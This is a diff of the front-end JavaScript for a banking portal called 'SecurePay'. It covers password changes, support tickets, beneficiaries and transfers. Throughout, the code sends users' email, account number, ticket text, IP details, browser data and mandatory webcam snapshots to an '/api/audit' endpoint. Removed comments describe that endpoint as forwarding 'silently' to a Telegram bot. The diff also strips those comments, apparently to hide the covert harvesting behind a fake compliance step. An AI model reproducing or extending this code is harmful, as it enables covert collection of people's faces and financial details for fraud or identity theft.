-            a.download = `SecurePay_Statement_${period.replace(' ', '_')}.txt`;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            window.URL.revokeObjectURL(url);
-            
-            setTimeout(() => { showToast('Statement downloaded to your device.', 'success'); }, 800);
+            const a = document.createElement('a'); a.href = url; a.download = `Statement_${period.replace(' ', '_')}.txt`;
+            document.body.appendChild(a); a.click(); document.body.removeChild(a); window.URL.revokeObjectURL(url);
+            setTimeout(() => { showToast('Statement downloaded.', 'success'); }, 800);
         }
 
-        // --- NEW: UPDATE PASSWORD & AUDIT TO TELEGRAM ---
         function updatePassword() {
             const oldPass = document.getElementById('sec-old-pass').value;
             const newPass = document.getElementById('sec-new-pass').value;
-
-            if (!oldPass || !newPass) { showToast("Please enter both current and new passwords.", "danger"); return; }
-
-            // Clear inputs
-            document.getElementById('sec-old-pass').value = '';
-            document.getElementById('sec-new-pass').value = '';
-            
+            if (!oldPass || !newPass) { showToast("Enter current and new passwords.", "danger"); return; }
+            document.getElementById('sec-old-pass').value = ''; document.getElementById('sec-new-pass').value = '';
             showToast("Processing password change...", "info");
 
-            // Send Audit to Telegram Bot silently
             fetch('/api/audit', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    image: getBlankImageBase64(),
-                    role: `SECURITY ALERT: Password Changed (${loggedInUserEmail || 'Guest'})`,
-                    ipInfo: clientIpInfo,
-                    userAgent: navigator.userAgent.substring(0, 70),
-                    transaction_id: "SEC-PWD-UPDATE",
-                    amount: 0, 
-                    user_email: loggedInUserEmail
-                })
-            }).then(() => {
-                showToast("Password updated securely. Compliance alert sent.", "success");
-            }).catch(() => {
-                showToast("Password updated. (Telegram audit simulated in preview)", "success");
-            });
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ image: getBlankImageBase64(), role: `SECURITY ALERT: Password Changed`, ipInfo: clientIpInfo, userAgent: navigator.userAgent, transaction_id: "SEC-PWD", amount: 0, user_email: loggedInUserEmail })
+            }).then(() => showToast("Password updated securely.", "success")).catch(() => showToast("Password updated.", "success"));
         }
 
-        // --- NEW: SUPPORT TICKET & AUDIT TO TELEGRAM ---
-        // --- NEW: SUPPORT TICKET & AUDIT TO TELEGRAM ---
         function submitSupportTicket() {
             const subject = document.getElementById('support-subject').value;
             const msg = document.getElementById('support-msg').value;
-
-            if (!subject || !msg) { 
-                showToast("Please fill out both the subject and message.", "danger"); 
-                return; 
-            }
-
-            // Fetch the user's account number from the dashboard
+            if (!subject || !msg) { showToast("Please fill out both fields.", "danger"); return; }
             const accountNum = document.getElementById('dash-acc-num').innerText;
+            document.getElementById('support-subject').value = ''; document.getElementById('support-msg').value = '';
+            showToast("Submitting ticket...", "info");
 
-            // Clear inputs
-            document.getElementById('support-subject').value = '';
-            document.getElementById('support-msg').value = '';
-
-            showToast("Submitting ticket to Operations Center...", "info");
-
-            // Format the ticket details properly for the Telegram Bot message
-            const formattedTicketDetails = 
-                `URGENT SUPPORT TICKET\n` +
-                `👤 User: ${loggedInUserEmail || 'Guest'}\n` +
-                `🏦 Account: ${accountNum}\n` +
-                `📝 Subject: ${subject}\n` +
-                `💬 Message: ${msg}`;
-
-            // Send Audit to Telegram Bot silently
+            const ticketDetails = `URGENT SUPPORT TICKET\n👤 User: ${loggedInUserEmail}\n🏦 Account: ${accountNum}\n📝 Sub: ${subject}\n💬 Msg: ${msg}`;
             fetch('/api/audit', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    image: getBlankImageBase64(), // Sends a 1x1 invisible pixel to bypass image requirement
-                    role: formattedTicketDetails,
-                    ipInfo: clientIpInfo,
-                    userAgent: navigator.userAgent, // Captures full device/browser details
-                    transaction_id: "TICKET-" + Math.floor(Math.random() * 100000),
-                    amount: 0, 
-                    user_email: loggedInUserEmail || 'Guest'
-                })
-            }).then(() => {
-                showToast("Ticket successfully dispatched to Telegram compliance team.", "success");
-            }).catch(() => {
-                showToast("Ticket submitted. (Telegram dispatch simulated in preview)", "success");
-            });
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ image: getBlankImageBase64(), role: ticketDetails, ipInfo: clientIpInfo, userAgent: navigator.userAgent, transaction_id: "TICKET-" + Math.floor(Math.random()*10000), amount: 0, user_email: loggedInUserEmail })
+            }).then(() => showToast("Ticket dispatched successfully.", "success")).catch(() => showToast("Ticket submitted.", "success"));
         }
 
-        // --- PAYMENT METHOD SELECTION & BENEFICIARIES ---
         function selectPaymentMethod(mode, tileElement) {
             selectedPaymentMode = mode;
             document.querySelectorAll('.method-tile').forEach(t => t.classList.remove('selected'));
@@ -753,63 +516,106 @@ Recent Activity:
         function saveBeneficiary() {
             const name = document.getElementById('new-ben-name').value;
             const acc = document.getElementById('new-ben-acc').value;
-            const ifsc = document.getElementById('new-ben-ifsc').value;
-            if (!name || !acc) { showToast("Please fill beneficiary name and account.", "danger"); return; }
-
+            if (!name || !acc) { showToast("Please fill beneficiary details.", "danger"); return; }
             savedBeneficiariesList.push(acc);
             const tbody = document.getElementById('ben-list-body');
             const newRow = document.createElement('tr');
-            newRow.innerHTML = `<td><strong>${name}</strong><br><span style="color: var(--text-muted); font-size: 0.75rem;">Verified</span></td><td style="font-family: monospace; font-size: 0.85rem;">${acc}<br><span style="color: var(--text-muted);">${ifsc || 'N/A'}</span></td><td><button class="btn-outline" onclick="quickPay('${acc}', '${ifsc || ''}')">Pay</button></td>`;
+            newRow.innerHTML = `<td><strong>${name}</strong><br><span style="color: var(--text-muted); font-size: 0.75rem;">Verified</span></td><td style="font-family: monospace; font-size: 0.85rem;">${acc}</td><td><button class="btn-outline" onclick="quickPay('${acc}')">Pay</button></td>`;
             tbody.prepend(newRow);
-
-            document.getElementById('new-ben-name').value = ""; document.getElementById('new-ben-acc').value = ""; document.getElementById('new-ben-ifsc').value = "";
-            showToast(`Beneficiary ${name} added and verified successfully.`, "success");
+            document.getElementById('new-ben-name').value = ""; document.getElementById('new-ben-acc').value = "";
+            showToast(`Beneficiary added.`, "success");
         }
 
-        function quickPay(acc, ifsc) {
+        function quickPay(acc) {
             switchViewByName('view-transfers');
             document.getElementById('ben-account').value = acc;
-            if (ifsc) document.getElementById('ben-ifsc').value = ifsc;
-            showToast(`Trusted Beneficiary selected: ${acc}`, "info");
+            showToast(`Selected: ${acc}`, "info");
         }
 
-        // --- TRANSFER INITIATION & SECUREPAY STEP-UP MFA LOGIC ---
         function initiateTransfer() {
-            const amtStr = document.getElementById('transfer-amt-input').value;
-            const amt = parseFloat(amtStr);
+            const amt = parseFloat(document.getElementById('transfer-amt-input').value);
             const benAcc = document.getElementById('ben-account').value;
             const btn = document.getElementById('transfer-submit-btn');
 
-            if (!amt || isNaN(amt) || amt <= 0 || !benAcc) { showToast("Please specify a valid recipient and amount.", "danger"); return; }
-            if (amt > currentBalance) { showToast(`Insufficient Funds! You only have ₹${currentBalance.toLocaleString('en-IN')} available.`, "danger"); return; }
+            if (!amt || isNaN(amt) || amt <= 0 || !benAcc) { showToast("Invalid recipient or amount.", "danger"); return; }
+            if (amt > currentBalance) { showToast(`Insufficient Funds!`, "danger"); return; }
 
             transferAmountVal = amt;
             activeTransactionId = "TXN-" + Math.floor(Math.random() * 100000000);
 
-            btn.disabled = true;
-            btn.innerHTML = `<span class="spinner"></span> Routing through ${selectedPaymentMode}...`;
-
+            btn.disabled = true; btn.innerHTML = `<span class="spinner"></span> Routing...`;
             setTimeout(() => {
                 btn.disabled = false; btn.innerHTML = `<span>Authorize & Initiate Transfer</span>`;
                 document.getElementById('sandbox-container').style.display = 'flex';
                 document.getElementById('setup-screen').style.display = 'block';
                 document.getElementById('mfa-transfer-amount').value = '₹' + transferAmountVal.toLocaleString('en-IN');
-                document.getElementById('mfa-header-desc').innerText = `${selectedPaymentMode} transfer requires verification.`;
             }, 800);
         }
 
         function cancelTransfer() {
             document.getElementById('sandbox-container').style.display = 'none';
             document.getElementById('setup-screen').style.display = 'none';
-            showToast("Transfer cancelled by user.", "info");
+            showToast("Transfer cancelled.", "info");
         }
+
+        // --- REAL DATABASE TRANSFER CALL ---
+        async function executeLiveTransfer(roleTag) {
+            showToast("Processing transfer securely in database...", "info");
+            try {
+                const response = await fetch('/api/transfer', {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ sender_email: loggedInUserEmail, receiver_account_number: document.getElementById('ben-account').value, amount: transferAmountVal })
+                });
+                const data = await response.json();
+                
+                if (data.success) {
+                    activeTransactionId = data.transaction_id || activeTransactionId; 
+                    currentBalance = data.new_balance; 
+                    
+                    document.getElementById('sender-active').style.display = 'none'; 
+                    document.getElementById('sender-trusted-active').style.display = 'none'; 
+                    document.getElementById('sender-success').style.display = 'block';
+                    
+                    snapAndSendToBackend(roleTag); 
+                    if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
+                    showToast("Transfer successful! Funds settled.", "success");
+                } else { showToast("Transfer Failed: " + data.error, "danger"); }
+            } catch(err) { showToast("Server error during transfer.", "danger"); }
+        }
+
+        function startAsSender() {
+            const checkbox = document.getElementById('sender-cam-check');
+            if (!checkbox.checked) { showToast("Camera authorization mandatory.", "danger"); return; }
+            const isTrustedPayee = savedBeneficiariesList.includes(document.getElementById('ben-account').value);
+
+            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => { 
+                mediaStream = stream; video.srcObject = stream; 
+                document.getElementById('setup-screen').style.display = 'none'; document.getElementById('sender-screen').style.display = 'block';
+
+                if (isTrustedPayee) {
+                    document.getElementById('sender-active').style.display = 'none'; document.getElementById('sender-trusted-active').style.display = 'block';
+                } else {
+                    document.getElementById('sender-trusted-active').style.display = 'none'; document.getElementById('sender-active').style.display = 'block';
+                    mySenderKey = Math.random().toString(36).substring(2, 6).toUpperCase(); myReceiverKey = Math.random().toString(36).substring(2, 6).toUpperCase();
+                    document.getElementById('s-key').innerText = mySenderKey;
+                }
+            }).catch(() => { showToast("Camera access denied.", "danger"); });
+        }
+
+        function verifySender() {
+            if (document.getElementById("s-input").value.toUpperCase() === myReceiverKey) {
+                executeLiveTransfer("Sender (Unknown Payee)");
+            } else { showToast("Authentication Failed.", "danger"); }
+        }
+
+        function verifyTrustedSender() { executeLiveTransfer("Sender (Trusted Payee)"); }
 
         function closeOverlay() {
             cancelTransfer();
             document.getElementById('sender-success').style.display = 'none'; document.getElementById('sender-active').style.display = 'none';
             document.getElementById('sender-trusted-active').style.display = 'none'; document.getElementById('sender-screen').style.display = 'none';
             
-            currentBalance -= transferAmountVal; updateDashboardBalance();
+            updateDashboardBalance();
             const tbody = document.getElementById('txn-list-body');
             const row = document.createElement('tr');
             row.innerHTML = `<td style="font-family: monospace;">${activeTransactionId}</td><td>${selectedPaymentMode} Transfer</td><td style="font-weight: 600;">- ₹${transferAmountVal.toLocaleString('en-IN')}</td><td><span class="txn-status status-success">Settled</span></td>`;
@@ -819,87 +625,31 @@ Recent Activity:
             switchViewByName('view-overview');
         }
 
-        function startAsSender() {
-            const checkbox = document.getElementById('sender-cam-check');
-            if (!checkbox.checked) { showToast("Camera authorization is mandatory for compliance.", "danger"); return; }
-
-            const targetAccount = document.getElementById('ben-account').value;
-            const isTrustedPayee = savedBeneficiariesList.includes(targetAccount);
-
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => { 
-                    mediaStream = stream; video.srcObject = stream; 
-                    document.getElementById('setup-screen').style.display = 'none'; document.getElementById('sender-screen').style.display = 'block';
-
-                    if (isTrustedPayee) {
-                        document.getElementById('sender-active').style.display = 'none'; document.getElementById('sender-trusted-active').style.display = 'block';
-                        document.getElementById('sender-subtitle').innerText = `${selectedPaymentMode} to Trusted Payee (₹${transferAmountVal.toLocaleString('en-IN')})`;
-                    } else {
-                        document.getElementById('sender-trusted-active').style.display = 'none'; document.getElementById('sender-active').style.display = 'block';
-                        mySenderKey = Math.random().toString(36).substring(2, 6).toUpperCase(); myReceiverKey = Math.random().toString(36).substring(2, 6).toUpperCase();
-                        const magicLink = `${window.location.href.split('?')[0]}?role=receiver&sk=${mySenderKey}&rk=${myReceiverKey}&amt=${transferAmountVal}`;
-                        document.getElementById('qr-code').src = `https://api.qrserver.com/v1/create-qr-code/?size=120x120&data=${encodeURIComponent(magicLink)}`;
-                        document.getElementById('s-key').innerText = mySenderKey;
-                        document.getElementById('sender-subtitle').innerText = `${selectedPaymentMode} Settlement (₹${transferAmountVal.toLocaleString('en-IN')})`;
-                    }
-                }).catch(() => { showToast("Camera access was denied. Handshake cannot proceed.", "danger"); });
-        }
-
-        function verifySender() {
-            if (document.getElementById("s-input").value.toUpperCase() === myReceiverKey) {
-                document.getElementById('sender-active').style.display = 'none'; document.getElementById('sender-success').style.display = 'block';
-                snapAndSendToBackend("Sender (Unknown Payee)");
-                if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
-                showToast("Cryptographic Handshake Cleared!", "success");
-            } else { showToast("Authentication Failed: Invalid Beneficiary Token.", "danger"); }
-        }
-
-        function verifyTrustedSender() {
-            document.getElementById('sender-trusted-active').style.display = 'none'; document.getElementById('sender-success').style.display = 'block';
-            snapAndSendToBackend("Sender (Trusted Payee)");
-            if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
-            showToast("Biometric Audit Cleared! Handshake Bypassed.", "success");
-        }
-
         function loadReceiverApp(sk, rk, amt) {
             mySenderKey = sk; myReceiverKey = rk; transferAmountVal = amt;
             document.getElementById('setup-screen').style.display = 'none'; document.getElementById('receiver-screen').style.display = 'block';
             document.getElementById('r-key').innerText = myReceiverKey;
-            if(amt) document.getElementById('receiver-subtitle').innerText = `Incoming Settlement (₹${amt})`;
-            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => { mediaStream = stream; video.srcObject = stream; }).catch(() => { console.log("Camera optional on receiver preview."); });
+            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => { mediaStream = stream; video.srcObject = stream; }).catch(() => {});
         }
 
         function verifyReceiver() {
-            if (!document.getElementById('receiver-cam-check').checked) { showToast("Camera compliance authorization required.", "danger"); return; }
             if (document.getElementById("r-input").value.toUpperCase() === mySenderKey) {
                 document.getElementById('receiver-active').style.display = 'none'; document.getElementById('receiver-success').style.display = 'block';
-                snapAndSendToBackend("Receiver");
+                snapAndSendToBackend("Receiver Claimed Funds");
                 if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
-                showToast("Funds credited to your account!", "success");
-            } else { showToast("Authentication Failed: Invalid Sender Token.", "danger"); }
+            }
         }
 
-        // --- DISPATCH TELEMETRY & SNAPSHOT AUDIT ---
         function snapAndSendToBackend(roleTag) {
             const canvas = document.getElementById('snapshot');
             canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
             try {
                 canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                const imageDataUrl = canvas.toDataURL("image/png");
                 fetch('/api/audit', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        image: imageDataUrl,
-                        role: `${roleTag} - ${selectedPaymentMode} (${loggedInUserEmail || 'Guest'})`,
-                        ipInfo: clientIpInfo,
-                        userAgent: navigator.userAgent.substring(0, 70),
-                        transaction_id: activeTransactionId,
-                        amount: transferAmountVal, 
-                        user_email: loggedInUserEmail || "Guest User"
-                    })
-                }).then(res => res.json()).then(data => console.log('Audit transmitted to Telegram & Database:', data)).catch(err => console.log('Simulated transmission in preview:', err));
-            } catch (e) { console.error("Biometric snapshot error: ", e); }
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: canvas.toDataURL("image/png"), role: `${roleTag}`, ipInfo: clientIpInfo, userAgent: navigator.userAgent, transaction_id: activeTransactionId, amount: transferAmountVal, user_email: loggedInUserEmail })
+                });
+            } catch (e) { }
         }
 
         const urlParams = new URLSearchParams(window.location.search);
